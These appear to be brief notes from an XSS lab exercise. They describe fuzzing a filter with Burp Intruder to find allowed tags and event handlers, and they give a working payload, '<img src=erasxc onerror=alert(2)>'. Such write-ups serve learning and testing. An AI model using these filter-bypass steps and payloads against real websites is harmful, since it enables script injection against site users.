solution 3
We can use the cheat sheet to copy all the possible tags
and then using the intruder in burp to check which tags works
Then we do the same thing with the events.
for example
<$$>        <body>               200 First run ( we found out that the body is possible)
<body $$>   <body onresize>      200 Second run( we found out that the event is possible)

solution 3
trying a single tag likg img
img doesnt require a closing tag
<img src=erasxc onerror=alert(2)>
